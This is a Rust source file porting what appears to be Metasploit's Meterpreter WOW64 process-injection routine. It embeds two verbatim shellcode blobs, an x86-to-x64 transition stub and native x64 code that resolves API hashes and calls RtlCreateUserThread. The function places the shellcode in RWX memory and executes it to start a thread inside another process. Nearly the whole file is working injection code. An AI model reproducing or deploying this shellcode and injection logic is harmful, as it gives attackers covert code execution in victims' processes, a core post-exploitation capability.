//! Port of src/inject_rtlcreateuserthread_wow64.cpp — the x86-only
//! technique that transitions a WOW64 process into native x64 and creates a
//! remote thread in the target process via RtlCreateUserThread.
//!
//! The C++ file is wrapped in `#if defined _M_IX86` (only compiled into x86
//! builds). The Rust port is a single codebase targeting x64; the function
//! and both shellcode blobs are ported verbatim so the symbol exists, and
//! the x64 build never invokes it (mirroring the C++ _M_X64 build, where
//! `inject_via_remotethread_wow64` is also absent from the execute tree).
//!
//! `migrate_executex64` is the wow64->x64 transition stub and
//! `migrate_wownativex` is the native x64 function that uses the Win64 APIs
//! to create the remote thread (see the asm sources referenced in the C++).

use std::ffi::c_void;
use windows_sys::Win32::Foundation::{
    SetLastError, ERROR_ACCESS_DENIED, ERROR_INVALID_HANDLE, HANDLE,
};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_DECOMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::SystemInformation::{GetVersionExA, OSVERSIONINFOA};
use windows_sys::Win32::System::Threading::ResumeThread;

/// see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
const MIGRATE_EXECUTEX64: [u8; 75] = [
    0x55, 0x89, 0xE5, 0x56, 0x57, 0x8B, 0x75, 0x08, 0x8B, 0x4D, 0x0C, 0xE8, 0x00, 0x00, 0x00, 0x00,
    0x58, 0x83, 0xC0, 0x25, 0x83, 0xEC, 0x08, 0x89, 0xE2, 0xC7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00,
    0x89, 0x02, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x83, 0xC4, 0x14, 0x5F, 0x5E, 0x5D, 0xC2, 0x08, 0x00,
    0x8B, 0x3C, 0x24, 0xFF, 0x2A, 0x48, 0x31, 0xC0, 0x57, 0xFF, 0xD6, 0x5F, 0x50, 0xC7, 0x44, 0x24,
    0x04, 0x23, 0x00, 0x00, 0x00, 0x89, 0x3C, 0x24, 0xFF, 0x2C, 0x24,
];

/// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
const MIGRATE_WOWNATIVEX: [u8; 296] = [
    0xFC, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xE7, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00,
    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48,
    0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A,
    0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9,
    0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C,
    0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x75, 0x72, 0x8B, 0x80, 0x88, 0x00, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40,
    0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6,
    0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
    0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40,
    0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0,
    0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A,
    0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF, 0xFF, 0xFF, 0x5D, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x48, 0x8D,
    0x46, 0x18, 0x50, 0xFF, 0x76, 0x10, 0xFF, 0x76, 0x08, 0x41, 0x51, 0x41, 0x51, 0x49, 0xB8, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xD2, 0x48, 0x8B, 0x0E, 0x41, 0xBA, 0xC8,
    0x38, 0xA4, 0x40, 0xFF, 0xD5, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC4, 0x50, 0x48, 0x89, 0xFC, 0xC3,
];

/// WOW64CONTEXT — four 8-byte unions (handle / pointer / pointer / handle).
#[repr(C)]
#[derive(Clone, Copy)]
struct Wow64Context {
    h_process: u64,
    lp_start_address: u64,
    lp_parameter: u64,
    h_thread: u64,
}

/// BOOL (WINAPI * X64FUNCTION)(DWORD dwParameter).
type X64Function = unsafe extern "system" fn(u32) -> i32;
/// DWORD (WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter).
type ExecuteX64 = unsafe extern "system" fn(X64Function, u32) -> u32;

/// Uses RtlCreateUserThread (inject_via_remotethread_wow64).
pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
    unsafe {
        let mut os: OSVERSIONINFOA = std::mem::zeroed();
        os.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOA>() as u32;

        // check for and filter out Windows 2003. This method doesn't work there for some reason.
        if GetVersionExA(&mut os) == 0 {
            return false;
        }

        if os.dwMajorVersion == 5 && os.dwMinorVersion == 2 {
            SetLastError(ERROR_ACCESS_DENIED);
            return false;
        }

        // alloc a RWX buffer in this process for the EXECUTEX64 function
        let p_execute_x64 = VirtualAlloc(
            std::ptr::null(),
            MIGRATE_EXECUTEX64.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if p_execute_x64.is_null() {
            return false;
        }

        // alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
        let p_x64function = VirtualAlloc(
            std::ptr::null(),
            MIGRATE_WOWNATIVEX.len() + std::mem::size_of::<Wow64Context>(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if p_x64function.is_null() {
            return false; /* TODO: pExecuteX64 not released. */
        }

        // copy over the wow64->x64 stub
        std::ptr::copy_nonoverlapping(
            MIGRATE_EXECUTEX64.as_ptr(),
            p_execute_x64 as *mut u8,
            MIGRATE_EXECUTEX64.len(),
        );

        // copy over the native x64 function
        std::ptr::copy_nonoverlapping(
            MIGRATE_WOWNATIVEX.as_ptr(),
            p_x64function as *mut u8,
            MIGRATE_WOWNATIVEX.len(),
        );

        // set the context
        let ctx = (p_x64function as *mut u8).add(MIGRATE_WOWNATIVEX.len()) as *mut Wow64Context;
        (*ctx).h_process = h_process as u64;
        (*ctx).lp_start_address = lp_start_address as u64;
        (*ctx).lp_parameter = lp_parameter as u64;
        (*ctx).h_thread = 0;

        // Transition this wow64 process into native x64 and call pX64function(ctx).
        // The native function will use the native Win64 API's to create a remote
        // thread in the target process.
        let p_execute_x64_fn: ExecuteX64 = std::mem::transmute(p_execute_x64);
        let p_x64_function: X64Function = std::mem::transmute(p_x64function);
        if p_execute_x64_fn(p_x64_function, ctx as u32) == 0 {
            SetLastError(ERROR_ACCESS_DENIED);
            return false; /* TODO: pExecuteX64 and pX64function not released. */
        }

        if (*ctx).h_thread == 0 {
            SetLastError(ERROR_INVALID_HANDLE);
            return false; /* TODO: pExecuteX64 and pX64function not released. */
        }

        // Success! grab the new thread handle from the context.
        // PITA, this function creates our thread in a suspended state. Dumb, I know.
        ResumeThread((*ctx).h_thread as HANDLE);

        VirtualFree(p_execute_x64, 0, MEM_DECOMMIT); /* TODO: why MEM_DECOMMIT */
        VirtualFree(p_x64function, 0, MEM_DECOMMIT);

        true
    }
}
